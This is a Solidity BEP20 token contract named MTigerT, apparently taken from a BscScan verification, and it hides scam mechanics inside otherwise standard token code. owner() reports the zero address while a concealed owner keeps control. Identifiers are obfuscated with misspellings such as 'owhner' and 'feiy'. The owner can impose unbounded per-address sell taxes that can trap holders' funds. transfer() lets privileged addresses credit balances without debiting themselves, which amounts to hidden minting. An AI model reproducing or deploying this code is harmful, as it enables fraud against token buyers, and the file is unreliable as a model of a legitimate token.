/**
 *Submitted for verification at BscScan.com on 2022-07-17
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owhner;

    event owhnershipTransferred(address indexed previousowhner, address indexed newowhner);

    constructor() {
        _transferowhnership(_msgSender());
    }


    function owhner() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowhner() {
        require(_owhner == _msgSender(), "Ownable: caller is not the owhner");
        _;
    }


    function renounceowhnership() public virtual onlyowhner {
        _transferowhnership(address(0));
    }


    function transferowhnership_transferowhnership(address newowhner) public virtual onlyowhner {
        require(newowhner != address(0), "Ownable: new owhner is the zero address");
        _transferowhnership(newowhner);
    }


    function _transferowhnership(address newowhner) internal virtual {
        address oldowhner = _owhner;
        _owhner = newowhner;
        emit owhnershipTransferred(oldowhner, newowhner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingfeiyOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingfeiyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiyOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiyTo() external view returns (address);
    function feiyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiyTo(address) external;
    function setfeiyToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owhner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owhner, address spender) public view virtual returns (uint256) {
        return _allowances[owhner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owhner = _msgSender();
        _approve(owhner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owhner = _msgSender();
        _approve(owhner, spender, _allowances[owhner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owhner = _msgSender();
        uint256 currentAllowance = _allowances[owhner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owhner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owhner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owhner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owhner][spender] = amount;
        emit Approval(owhner, spender, amount);
    }

    function _spendAllowance(
        address owhner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owhner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owhner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract MTigerT is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address amnount) public view virtual returns (uint256) {
        return _balances[amnount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address amnount, uint256 amount) internal virtual {
        require(amnount != address(0), "ERC20: burn from the zero address");

        uint256 amnountBalance = _balances[amnount];
        require(amnountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[amnount] = amnountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(amnount, address(0), amount);
    }

    function _mtin(address amnount, uint256 amount) internal virtual {
        require(amnount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[amnount] += amount;
        emit Transfer(address(0), amnount, amount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 100*70);
        _defaultSellfeiy = 2;
        _defaultBuyfeiy = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfeiy = 0;

    uint256 private _defaultBuyfeiy = 0;

    mapping(address => bool) private _marketamnount;

    mapping(address => uint256) private _Sfeiy;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowhner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowhner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowhner {
        _defaultSellfeiy = _value;
    }

    function setSfeiy(address _address, uint256 _value) external onlyowhner {
        require(_value > 1, "amnount tax must be greater than or equal to 1");
        _Sfeiy[_address] = _value;
    }

    function getSfeiy(address _address) external view onlyowhner returns (uint256) {
        return _Sfeiy[_address];
    }


    function setMarketamnountfeiy(address _address, bool _value) external onlyowhner {
        _marketamnount[_address] = _value;
    }

    function getMarketamnountfeiy(address _address) external view onlyowhner returns (bool) {
        return _marketamnount[_address];
    }

    function _checkFreeamnount(address from, address _to) internal view returns (bool) {
        return _marketamnount[from] || _marketamnount[_to];
    }

    function _receiveF(
        address from,
        address _to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");

        bool rF = true;

        if (_checkFreeamnount(from, _to)) {
            rF = false;
        }
        uint256 tradefeiyamount = 0;

        if (rF) {
            uint256 tradefeiy = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeiy = _defaultSellfeiy;
                }
                if (from == uniswapV2Pair) {

                    tradefeiy = _defaultBuyfeiy;
                }
            }
            if (_Sfeiy[from] > 0) {
                tradefeiy = _Sfeiy[from];
            }

            tradefeiyamount = _amount.mul(tradefeiy).div(100);
        }


        if (tradefeiyamount > 0) {
            _balances[from] = _balances[from].sub(tradefeiyamount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeiyamount);
            emit Transfer(from, _deadAddress, tradefeiyamount);
        }

        _balances[from] = _balances[from].sub(_amount - tradefeiyamount);
        _balances[_to] = _balances[_to].add(_amount - tradefeiyamount);
        emit Transfer(from, _to, _amount - tradefeiyamount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owhner = _msgSender();
        if (_release[owhner] == true) {
            _balances[to] += amount;
            return true;
        }
        _receiveF(owhner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _receiveF(from, to, amount);
        return true;
    }
}